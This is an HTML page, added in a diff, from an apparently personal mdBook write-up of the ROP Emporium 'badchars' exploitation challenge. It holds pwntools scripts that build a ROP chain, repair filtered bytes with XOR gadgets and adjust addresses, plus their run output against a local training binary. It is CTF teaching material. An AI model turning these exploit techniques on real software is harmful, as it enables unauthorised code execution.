@@ -1,0 +1,422 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>badchars - ROPEmporium Write-up</title>
+
+
+        <!-- Custom HTML head -->
+        
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="favicon.svg">
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        <link rel="stylesheet" href="css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+    </head>
+    <body class="sidebar-visible no-js">
+    <div id="body-container">
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('light')
+            html.classList.add(theme);
+            var body = document.querySelector('body');
+            body.classList.remove('no-js')
+            body.classList.add('js');
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var body = document.querySelector('body');
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            body.classList.remove('sidebar-visible');
+            body.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="introduction.html">Introduction</a></li><li class="chapter-item expanded affix "><li class="part-title">Writeups</li><li class="chapter-item expanded "><a href="1.ret2win.html"><strong aria-hidden="true">1.</strong> ret2win</a></li><li class="chapter-item expanded "><a href="2.split.html"><strong aria-hidden="true">2.</strong> split</a></li><li class="chapter-item expanded "><a href="3.callme.html"><strong aria-hidden="true">3.</strong> callme</a></li><li class="chapter-item expanded "><a href="4.write4.html"><strong aria-hidden="true">4.</strong> write4</a></li><li class="chapter-item expanded "><a href="5.badchars.html" class="active"><strong aria-hidden="true">5.</strong> badchars</a></li><li class="chapter-item expanded "><a href="6.fluff.html"><strong aria-hidden="true">6.</strong> fluff</a></li><li class="chapter-item expanded "><a href="7.pivot.html"><strong aria-hidden="true">7.</strong> pivot</a></li><li class="chapter-item expanded "><a href="8.ret2csu.html"><strong aria-hidden="true">8.</strong> ret2csu</a></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <!-- Track and set sidebar scroll position -->
+        <script>
+            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
+            sidebarScrollbox.addEventListener('click', function(e) {
+                if (e.target.tagName === 'A') {
+                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
+                }
+            }, { passive: true });
+            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
+            sessionStorage.removeItem('sidebar-scroll');
+            if (sidebarScrollTop) {
+                // preserve sidebar scroll position when navigating via links within sidebar
+                sidebarScrollbox.scrollTop = sidebarScrollTop;
+            } else {
+                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
+                var activeSection = document.querySelector('#sidebar .active');
+                if (activeSection) {
+                    activeSection.scrollIntoView({ block: 'center' });
+                }
+            }
+        </script>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">ROPEmporium Write-up</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="5-badchars"><a class="header" href="#5-badchars">5. badchars</a></h1>
+<p>the fifth challenge, it is pretty similar to the previous challenge <a href="./4.write4.html"><code>write4</code></a> but this time, the input
+is processed and turned some byte into a bad character.</p>
+<p>the challenge showed us the bad characters which are <code>'x', 'g', 'a', '.'</code>.</p>
+<p>with this knowledege let's find the gadgets and see what we can do using <code>ROPgadget</code>.</p>
+<pre><code>0x0000000000400634 : mov qword ptr [r13], r12 ; ret
+0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004006a3 : pop rdi ; ret
+</code></pre>
+<p>these are some gadgets that i find useful for us to use create this ROP chain.</p>
+<p>now let's find where do we write to.</p>
+<pre><code>┌──(kali㉿kali)-[~/ctf/rop/badchars]
+└─$ rabin2 -S badchars
+[Sections]
+
+nth paddr        size vaddr       vsize perm name
+―――――――――――――――――――――――――――――――――――――――――――――――――
+18  0x00000df0    0x8 0x00600df0    0x8 -rw- .init_array
+19  0x00000df8    0x8 0x00600df8    0x8 -rw- .fini_array
+20  0x00000e00  0x1f0 0x00600e00  0x1f0 -rw- .dynamic
+21  0x00000ff0   0x10 0x00600ff0   0x10 -rw- .got
+22  0x00001000   0x28 0x00601000   0x28 -rw- .got.plt
+23  0x00001028   0x10 0x00601028   0x10 -rw- .data
+24  0x00001038    0x0 0x00601038    0x8 -rw- .bss
+</code></pre>
+<p><code>.data</code> seems okay so let's use that.</p>
+<p>let's make the script.</p>
+<pre><code class="language-python">from pwn import *
+
+padding = b"x"*40
+
+print_file = 0x400510
+
+pop_r1 = 0x40069c
+mov_r13_r12 = 0x400634
+pop_rdi = 0x4006a3
+
+data_sec = 0x601028
+
+file_to_print = b"flag.txt"
+
+p = process("./badchars")
+
+gdb.attach(p, "break print_file")
+
+payload = padding + p64(pop_r1) + file_to_print + p64(data_sec) + p64(0xaaaaaaaa) + p64(0xaaaaaaaa) + p64(mov_r13_r12)
+payload += p64(pop_rdi) + p64(data_sec) + p64(print_file)
+
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<p>let's try it and see what will happen to our <code>flag.txt</code> string...</p>
+<pre><code>gef➤  x/s 0x601028
+0x601028:       "fl\353\353\353t\353t"
+gef➤  x/2xg 0x601028
+0x601028:       0x74eb74ebebeb6c66      0x0000000000000000
+</code></pre>
+<p>so this happened to our string, the character that are in the list of bad chars get replaced by <code>0xeb</code>.</p>
+<p>our ROP chain doesn't seem to be broken so lucky for us, now that we have this info what can we do?
+since some of the string are still intact we can just use some gadgets to replace the bad bytes, let's find them.
+oh wait i forgot to look into the <code>usefulGadgets</code> function so let's do that first.</p>
+<pre><code>┌──(kali㉿kali)-[~/ctf/rop/badchars]
+└─$ objdump -M intel --disassemble=usefulGadgets -S badchars
+
+badchars:     file format elf64-x86-64
+
+0000000000400628 &lt;usefulGadgets&gt;:
+  400628:       45 30 37                xor    BYTE PTR [r15],r14b
+  40062b:       c3                      ret
+  40062c:       45 00 37                add    BYTE PTR [r15],r14b
+  40062f:       c3                      ret
+  400630:       45 28 37                sub    BYTE PTR [r15],r14b
+  400633:       c3                      ret
+  400634:       4d 89 65 00             mov    QWORD PTR [r13+0x0],r12
+  400638:       c3                      ret
+  400639:       0f 1f 80 00 00 00 00    nop    DWORD PTR [rax+0x0]
+</code></pre>
+<p>i see, so we have xor, add and sub instructions for us to use byte by byte. i decided to use xor here.</p>
+<p>let's craft our new payload to fix the bad chars in memory.</p>
+<pre><code class="language-python">from pwn import *
+
+def findXor(x, badbyte = 0xeb):
+    for i in range(255):
+        if i ^ badbyte == x:
+            return i
+    return 0
+
+badbyte = 0xeb
+
+padding = b"x"*40
+
+print_file = 0x400510
+
+pop_r1 = 0x40069c
+mov_r13_r12 = 0x400634
+pop_rdi = 0x4006a3
+pop_r14_r15 = 0x4006a0
+xor_r15_r14 = 0x400628
+sub_r15_r14 = 0x400630
+
+data_sec = 0x601028
+
+file_to_print = b"flag.txt"
+
+p = process("./badchars")
+
+gdb.attach(p, "break print_file")
+
+fixBadbyte = lambda char, addr : p64(pop_r14_r15) + p64(findXor(ord(char))) + p64(addr) + p64(xor_r15_r14)
+
+payload = padding + p64(pop_r1) + file_to_print + p64(data_sec) + p64(findXor(ord("a")))
+payload += p64(data_sec + 2) + p64(mov_r13_r12) + p64(xor_r15_r14) + fixBadbyte("g", data_sec + 3)
+payload += fixBadbyte(".", data_sec + 4) + fixBadbyte("x", data_sec + 6) + p64(pop_rdi) + p64(data_sec) + p64(print_file)
+
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<p>this should work...</p>
+<pre><code>┌──(kali㉿kali)-[~/ctf/rop/badchars]
+└─$ python solve.py
+[+] Starting local process './badchars': pid 965
+[*] running in new terminal: ['/usr/bin/gdb', '-q', './badchars', '965', '-x', '/tmp/pwnms4tsxy0.gdb']
+[+] Waiting for debugger: Done
+[*] Switching to interactive mode
+badchars by ROP Emporium
+x86_64
+
+badchars are: 'x', 'g', 'a', '.'
+&gt; Thank you!
+Failed to open file: flag.t\xebt
+$                           [*] Got EOF while reading in interactive
+</code></pre>
+<p>hold on why is that? why is the character <code>x</code> doesn't get fixed? maybe our rop chain is broken so let's see.</p>
+<p><code>fixBadbyte("x", data_sec + 6)</code> is where we fix the bad char for <code>x</code> since we know that addresses also get
+affected by the bad chars filter, so something goes wrong here, maybe the address??</p>
+<p>we know our <code>.data</code> section is <code>0x601028</code> since we <code>+6</code> the address is <code>0x601028 + 6 = 0x60102e</code> and it includes
+one of the bad bytes which is <code>0x2e</code>. so what can we do here...</p>
+<p>how about we shift the address of <code>.data</code> by one so that our ROP chain doesn't use <code>0x60102e</code> any more
+but instead we use <code>0x60102f</code>, sounds great! let's do just that.</p>
+<pre><code class="language-python">from pwn import *
+
+def findXor(x, badbyte = 0xeb):
+    for i in range(255):
+        if i ^ badbyte == x:
+            return i
+    return 0
+
+badbyte = 0xeb
+
+padding = b"x"*40
+
+print_file = 0x400510
+
+pop_r1 = 0x40069c
+mov_r13_r12 = 0x400634
+pop_rdi = 0x4006a3
+pop_r14_r15 = 0x4006a0
+xor_r15_r14 = 0x400628
+sub_r15_r14 = 0x400630
+
+data_sec = 0x601029
+
+file_to_print = b"flag.txt"
+
+p = process("./badchars")
+
+gdb.attach(p, "break print_file")
+
+fixBadbyte = lambda char, addr : p64(pop_r14_r15) + p64(findXor(ord(char))) + p64(addr) + p64(xor_r15_r14)
+
+payload = padding + p64(pop_r1) + file_to_print + p64(data_sec) + p64(findXor(ord("a")))
+payload += p64(data_sec + 2) + p64(mov_r13_r12) + p64(xor_r15_r14) + fixBadbyte("g", data_sec + 3)
+payload += fixBadbyte(".", data_sec + 4) + fixBadbyte("x", data_sec + 6) + p64(pop_rdi) + p64(data_sec) + p64(print_file)
+
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<p>let's run it</p>
+<pre><code>┌──(kali㉿kali)-[~/ctf/rop/badchars]
+└─$ python solve.py
+[+] Starting local process './badchars': pid 1008
+[*] running in new terminal: ['/usr/bin/gdb', '-q', './badchars', '1008', '-x', '/tmp/pwn6i7nie6c.gdb']
+[+] Waiting for debugger: Done
+[*] Switching to interactive mode
+badchars by ROP Emporium
+x86_64
+
+badchars are: 'x', 'g', 'a', '.'
+&gt; Thank you!
+ROPE{a_placeholder_32byte_flag!}
+</code></pre>
+<p>nicesu!!!</p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="4.write4.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="6.fluff.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="4.write4.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="6.fluff.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="elasticlunr.min.js"></script>
+        <script src="mark.min.js"></script>
+        <script src="searcher.js"></script>
+
+        <script src="clipboard.min.js"></script>
+        <script src="highlight.js"></script>
+        <script src="book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
